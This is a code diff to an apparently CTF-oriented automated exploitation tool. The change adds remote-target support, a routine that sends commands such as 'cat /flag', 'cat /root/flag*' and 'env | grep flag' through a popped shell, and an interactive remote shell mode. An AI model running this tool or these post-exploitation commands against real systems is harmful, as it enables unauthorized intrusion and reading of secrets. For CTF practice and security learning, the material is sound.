@@ -2,10 +2,12 @@
 解题状态机: RECON -> DECOMPILE -> SCAN -> STRATEGY -> OFFSET(ACO) -> BUILD
             -> TEST -> VERIFY, 任一阶段失败自动回退换策略重试
 """
+import re
 import struct
+import sys
 import time
 
-from . import i18n
+from . import color, i18n
 from .aco import AntColony
 from .debugger import Process
 from .exploits import ExploitContext, ALL_STRATEGIES, cyclic, cyclic_find, p64
@@ -28,17 +30,21 @@ class State:
 STATE_ORDER = [State.RECON, State.DECOMPILE, State.SCAN, State.STRATEGY,
                State.OFFSET, State.BUILD, State.TEST, State.VERIFY]
 
+# common CTF flag shapes: flag{...}, CTF{...}, HTB{...}, picoCTF{...}, ...
+FLAG_RE = re.compile(r"[A-Za-z0-9_]{2,32}\{[^\n{}]{1,200}\}")
+
 
 class Logger:
     def __init__(self, verbose=True):
         self.verbose = verbose
         self.records = []
 
-    def log(self, state, msg):
-        line = f"[{state:>10}] {msg}"
-        self.records.append(line)
+    def log(self, state, msg, styled=None):
+        plain = f"[{state:>10}] {msg}"
+        self.records.append(plain)
         if self.verbose:
-            print(line)
+            tag = color.state(state, f"{state:>10}")
+            print(f"[{tag}] {styled if styled is not None else msg}")
 
     def raw(self, msg):
         self.records.append(msg)
@@ -47,16 +53,19 @@ class Logger:
 
 
 class FSM:
-    def __init__(self, path, log=None, lang="zh"):
+    def __init__(self, path, log=None, lang="zh", remote=None, keep_shell=False):
         i18n.set_lang(lang)
         self.path = path
+        self.remote = remote        # (host, port) when attacking a remote service
+        self.keep_shell = keep_shell  # leave the shell open for interactive use
         self.log = log or Logger()
         self.state = State.RECON
         self.trace = []           # (state, event, next_state)
         self.report_data = {
             "path": path, "mitigations": {}, "functions": [], "findings": [],
             "strategies": [], "offset": None, "aco": [], "notes": [],
-            "result": None, "steps": [],
+            "result": None, "steps": [], "flag": None, "shell_output": None,
+            "remote": f"{remote[0]}:{remote[1]}" if remote else None,
         }
 
     # ------------------------------------------------------------------
@@ -78,7 +87,9 @@ class FSM:
                    State.TEST: State.STRATEGY,
                    State.VERIFY: State.STRATEGY}.get(cur, State.FAILED)
         self.trace.append((cur, ev, nxt))
-        self.log.log(i18n.t("state"), f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}")
+        light = color.event(ok, f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}")
+        self.log.log(i18n.t("state"), f"{cur} --{ev}{'[ok]' if ok else '[x]'}--> {nxt}",
+                     styled=light)
         self.state = nxt
         return nxt
 
@@ -132,6 +143,7 @@ class FSM:
         # ---- STRATEGY (v1.2: ants walk the capability DAG) ----
         gadgets = GadgetFinder(self.elf)
         ctx = ExploitContext(self.elf, self.scanner, gadgets, self.log)
+        ctx.remote = self.remote
         self.ctx = ctx
 
         from .graph import Colony
@@ -144,7 +156,8 @@ class FSM:
             self.transition("verify", True)
             self.report_data["result"] = "pwned:dag"
             self.report_data["notes"] = ctx.notes
-            self.log.log(State.VERIFY, i18n.t("shell_ok"))
+            self.log.log(State.VERIFY, i18n.t("shell_ok"), styled=color.good(i18n.t("shell_ok")))
+            self._announce_flag()
             return True
 
         # ---- legacy linear fallback (safety net) ----
@@ -156,7 +169,9 @@ class FSM:
                 "ret2libc": 5, "ret2syscall": 6, "shellcode": 7}
         candidates.sort(key=lambda s: prio.get(s.name, 9))
         self.log.log(State.STRATEGY,
-                     f"feasible strategies: {[s.name for s in candidates] or 'none'}")
+                     f"feasible strategies: {[s.name for s in candidates] or 'none'}",
+                     styled=color.info(f"feasible strategies: "
+                                       f"{color.style([s.name for s in candidates] or 'none', 'bold')}"))
         self.report_data["strategies"] = [s.name for s in candidates]
         if not candidates:
             self._explain_no_strategy()
@@ -164,7 +179,8 @@ class FSM:
         for strat in candidates:
             self.state = State.STRATEGY
             tried.append(strat.name)
-            self.log.log(State.STRATEGY, f"==> {i18n.t(strat.key)}")
+            self.log.log(State.STRATEGY, f"==> {i18n.t(strat.key)}",
+                         styled=color.style(f"==> {i18n.t(strat.key)}", "bold", "bright_cyan"))
             self.report_data["steps"].append(f"strategy: {strat.name}")
             # ---- OFFSET via ACO (stack strategies only) ----
             if strat.name in ("ret2text", "ret2libc", "ret2syscall",
@@ -190,7 +206,8 @@ class FSM:
                 self.transition("verify", True)
                 self.report_data["result"] = f"pwned:{strat.name}"
                 self.report_data["notes"] = ctx.notes
-                self.log.log(State.VERIFY, i18n.t("shell_ok"))
+                self.log.log(State.VERIFY, i18n.t("shell_ok"), styled=color.good(i18n.t("shell_ok")))
+                self._announce_flag()
                 return True
             else:
                 self.log.raw(f"    [x] {i18n.t('failed')} (strategy={strat.name})")
@@ -200,6 +217,91 @@ class FSM:
         self.report_data["notes"] = ctx.notes
         self.report_data["tried"] = tried
         return False
+
+    # ------------------------------------------------------------------
+    def _grab_flag(self):
+        """read the flag (or whatever the shell can see) through the live shell"""
+        tube = (self.ctx.live.get("shell_tube")
+                if getattr(self, "ctx", None) else None)
+        if tube is None:
+            return None
+        cmds = [
+            b"id; pwd",
+            b"ls -la 2>/dev/null",
+            b"cat flag 2>/dev/null; cat flag.txt 2>/dev/null; "
+            b"cat ./flag 2>/dev/null; cat /flag 2>/dev/null; "
+            b"cat /flag.txt 2>/dev/null; cat /root/flag* 2>/dev/null; "
+            b"cat /home/*/flag* 2>/dev/null; env 2>/dev/null | grep -i flag",
+        ]
+        out = b""
+        try:
+            for c in cmds:
+                tube.sendline(c)
+                time.sleep(0.15)
+                out += tube.recv(0.4)
+        except (BrokenPipeError, OSError):
+            pass
+        text = out.decode("utf-8", "replace")
+        flag = None
+        for line in text.splitlines():
+            m = FLAG_RE.search(line)
+            if m:
+                flag = m.group(0)
+                break
+        self.report_data["shell_output"] = text.strip()
+        self.report_data["flag"] = flag
+        return flag
+
+    # ------------------------------------------------------------------
+    def _announce_flag(self):
+        flag = self._grab_flag()
+        tube = (self.ctx.live.get("shell_tube")
+                if getattr(self, "ctx", None) else None)
+        if flag:
+            msg = f"{i18n.t('flag_found')}: {flag}"
+            self.log.raw(color.good(msg))
+            self.report_data["steps"].append(f"flag: {flag}")
+        else:
+            self.log.raw(color.dim(i18n.t("flag_not_found")))
+            out = (self.report_data.get("shell_output") or "").strip()
+            for line in out.splitlines()[:6]:
+                self.log.raw(color.dim("  " + line))
+            if len(out.splitlines()) > 6:
+                self.log.raw(color.dim(f"  ... ({len(out.splitlines())} lines)"))
+        if tube is not None and not self.keep_shell:
+            tube.close()
+
+    # ------------------------------------------------------------------
+    def interactive(self):
+        """hand the live shell to the user (stdin lines -> target, output back)"""
+        tube = (self.ctx.live.get("shell_tube")
+                if getattr(self, "ctx", None) else None)
+        if tube is None:
+            self.log.raw(color.warn("no live shell to interact with"))
+            return
+        where = f"{self.remote[0]}:{self.remote[1]}" if self.remote else self.path
+        print(color.section(f"\n== interactive shell @ {where} =="))
+        print(color.dim("send commands line by line, 'exit'/'quit' or Ctrl-D to leave\n"))
+        while True:
+            if sys.stdin is not None and getattr(sys.stdin, "isatty", lambda: False)():
+                print(color.section("shell> "), end="", flush=True)
+            line = sys.stdin.readline()
+            if not line:
+                break
+            cmd = line.rstrip("\n")
+            if cmd.strip() in ("exit", "quit"):
+                break
+            try:
+                tube.sendline(cmd)
+            except (BrokenPipeError, OSError):
+                print(color.err("shell is gone"))
+                break
+            time.sleep(0.1)
+            out = tube.recv(0.5)
+            if out:
+                sys.stdout.write(out.decode("utf-8", "replace"))
+                sys.stdout.flush()
+        tube.close()
 
     # ------------------------------------------------------------------
     def dt_find_offset(self, preamble=b""):
